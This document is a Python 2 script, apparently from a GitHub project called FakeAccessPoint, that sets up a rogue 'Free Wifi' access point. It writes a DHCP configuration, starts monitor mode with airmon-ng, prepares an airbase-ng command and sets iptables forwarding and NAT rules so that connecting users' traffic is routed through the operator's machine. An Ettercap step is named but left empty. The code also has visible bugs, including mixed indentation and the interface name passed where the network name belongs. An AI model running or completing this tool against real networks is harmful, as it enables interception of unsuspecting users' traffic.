# Imports

import netifaces
import os 
import time 
import os.path

# Define Attributes

Version = "1.0"
Creator = "Raspberry"
Published = "https://github.com/Raspberryy/FakeAccessPoint"

APName = "Free Wifi"
APHostingInterface = "wlan0"
InternetInterface = "wlan0"
Gateway = "192.168.0.1"
Channel = "11"

Path = os.path.dirname(os.path.abspath(__file__))
OptionsArray = []
InterfaceArray = []
# Define Colours

pink = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
white = '\033[0m'
bold = '\033[1m'
under = '\033[4m'

# Define Functions

def GettingAttributes():
	
	# Get Interfaces Arrays
	InterfaceArray = netifaces.interfaces()	
	i = 0 
	
	
	while(i<len(InterfaceArray)):
		OptionsArray.append("")
		i = i+1 
	i = 0	
	LoadTable(InterfaceArray, OptionsArray)	
	
	# Get Interface which is connected to Internet
        IntegerInternet = int(raw_input(blue + "[=]" + white + " Enter Number of Interface WITH Internet: "))
        InternetInterface = InterfaceArray[IntegerInternet]
        OptionsArray[IntegerInternet] = "Internet-Connected"
        LoadTable(InterfaceArray, OptionsArray)	

	# Get Interface which is going to host the AP
	IntegerAP = int(raw_input(blue + "[=]" + white + "  Enter Number the AP Hosting Interface: " ))
	if(IntegerAP==IntegerInternet):
		print ""
		print "You need two diffrent Interfaces!"
		time.sleep(5)
		OptionsArray[IntegerInternet] = ""
                OptionsArray[IntegerAP] = ""
                GettingAttributes()

	APHostingInterface = InterfaceArray[IntegerAP]
	OptionsArray[IntegerAP] = "AP-Hosting Interface"
	LoadTable(InterfaceArray, OptionsArray)	
	
	# Get Gateway
	print ""
	print yellow + "[*]"  + white + " Getting Gateway"
	time.sleep(2)
	GatewayArray = netifaces.gateways()
	TempArray = GatewayArray['default'][netifaces.AF_INET]
	
	if(TempArray[1]==InternetInterface):
		Gateway = TempArray[0]
	else:
		os.system("clear")
		os.system("route -n")
		print ""
		print ""
		Gateway = raw_input(blue + "[=]" + white +"Enter your Gateway manually (Example: 192.168.2.1): " ) 
		os.system("clear")
	

	# Show Options 
	os.system("clear")
	print ""
	print "	Interface Connected to Internet	" + "||   " +  InternetInterface
	print "	AP-Hosting Interface		" + "||   " +  APHostingInterface
	print "	Gateway				" + "||   " +  Gateway

	print ""
	Feedback = str(raw_input(blue + "[=]" + white + " All Entries Correct [Y/n] "))
        print ""
	if(Feedback==""):
                print yellow + "[*]"  + white + "Set Routing"
        elif(Feedback=='Y'):
                print yellow + "[*]"  + white + "Set Routing"
        elif(Feedback=='y'):
                print yellow + "[*]"  + white + "Set Routing"
        else:
                OptionsArray[IntegerInternet] = ""
                OptionsArray[IntegerAP] = ""
                GettingAttributes()
	os.system("airmon-ng start "+APHostingInterface )
	SetIpRules(Gateway, InternetInterface)
	print yellow + "[*]"  + white + "Starting Airbase-Server"
	StartAirbaseServer(APHostingInterface)	
	print yellow + "[*]"  + white + "Starting Ettercap"
	StartEttercap()




	
def LoadTable(InterfaceArray, OptionsArray):
	i = 0
	# Set up Table
        os.system("clear")
        print ""
        print "	Number  ||      Interface       ||      Options         "
        print "	--------------------------------------------------------"

        # Fill Table
        while(i<len(InterfaceArray)):
                print "	" + str(i) + "	||	" + str(InterfaceArray[i]) + "		||	" + str(OptionsArray[i])
                i = i+1
        print ""



def SetUpDhcpServer():
	
	if(os.path.isfile("/etc/dhcpd.conf")):
		print red +'[-] ' + white + "Deleting old dhcpd.conf"
		os.system("rm /etc/dhcpd.conf")	
	
	print green + '[+] ' + white + "Creating dhcpd.conf"
	os.system("echo 'Authoritative;' > /etc/dhcpd.conf ")
	os.system("echo 'Default-lease-time 600;' >> /etc/dhcpd.conf ")
	os.system("echo 'Max-lease-time 7200;' >> /etc/dhcpd.conf ")
	os.system("echo 'Subnet 192.168.1.0 netmask 255.255.255.0 {' >> /etc/dhcpd.conf ")
	
	# Set AP-Name
	UserAP = raw_input(blue + "[=]" + white + " Enter desired AP-Name (e.g Free Wifi): " )
	apnamewithquo = '"' + UserAP + '"' 
	os.system("echo 'Option domain-name %s ;' >> /etc/dhcpd.conf " % apnamewithquo)
	
	os.system("echo 'Option routers 192.168.1.1;' >> /etc/dhcpd.conf ")
	os.system("echo 'Option subnet-mask 255.255.255.0;' >> /etc/dhcpd.conf ")
	os.system("echo 'Option domain-name-servers 192.168.1.1;' >> /etc/dhcpd.conf ")
	os.system("echo 'Range 192.168.1.2 192.168.1.40;' >> /etc/dhcpd.conf ")
	os.system("echo '}' >> /etc/dhcpd.conf ")	


def StartAirbaseServer(APHostingInterface):
	
	# Check for LogFile
	LogFile = Path + "/AirBase.log"
	if(os.path.isfile(LogFile)):
		print red +'[-] ' + white + "Delete AirBase.log"
        	os.system("rm %s" %LogFile)
	

	# Set Air-Base String
	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + APHostingInterface  +  " mon0 > " + Path + "/AirBase.log 2>&1"
	 
	#Execute
	print CommandAirBase
	#os.system(CommandAirBase) 

def StartEttercap():
	print ""

 
def SetIpRules(Gateway, InterfaceInternet):
	os.system("ifconfig at0 192.168.1.1 netmask 255.255.255.0")
	os.system("ifconfig at0 mtu 1400")
	os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("iptables -t nat -A PREROUTING -p udp -j DNAT --to %s" % Gateway)
	os.system("iptables -P FORWARD ACCEPT")
	os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")
	os.system("iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE" % InterfaceInternet)
	os.system("dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0")
	os.system("/etc/init.d/isc-dhcp-server start")
	

def HelpFunction():
	print ""





# Main Program

SetUpDhcpServer()

